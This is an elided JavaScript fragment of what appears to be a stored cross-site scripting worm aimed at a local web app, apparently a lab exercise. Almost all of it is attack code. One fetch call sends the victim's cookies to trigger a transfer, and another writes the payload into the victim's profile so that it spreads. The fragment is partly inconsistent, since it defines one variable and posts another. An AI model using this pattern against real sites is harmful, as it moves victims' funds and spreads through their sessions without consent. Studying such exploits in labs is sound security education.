...
let first_sploit = `fetch("http://localhost:3000/post_transfer", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
...
fetch("http://localhost:3000/set_profile", {
    ...
    "body": new_profile=${first_sploit},
    "method": "POST",
    "mode": "cors"
});`

await fetch("http://localhost:3000/set_profile", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    ...
    "referrer": "http://localhost:3000/set_profile",
    "body": `new_profile=${exploit_string}`,
    "method": "POST",
    "mode": "cors"
});
